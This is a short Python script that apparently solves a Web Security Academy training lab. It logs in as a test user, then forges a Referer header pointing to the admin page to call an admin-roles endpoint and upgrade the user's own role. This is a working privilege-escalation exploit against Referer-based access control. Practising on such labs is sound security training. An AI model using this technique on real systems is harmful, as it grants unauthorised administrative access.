import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup


url = 'https://0a32006b034577a3c23770b20057001f.web-security-academy.net/'

# Post login

data = {
    'username': 'wiener',
    'password': 'peter'
}

response = requests.post(
    url + 'login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['set-cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

headers = {
    'Referer': url + 'admin',
}

params = {
    'username': 'wiener',
    'action': 'upgrade',
}

response = requests.get(
    url + 'admin-roles',
    params=params,
    cookies=cookies,
    headers=headers,
    verify=False,
)

print(response.text)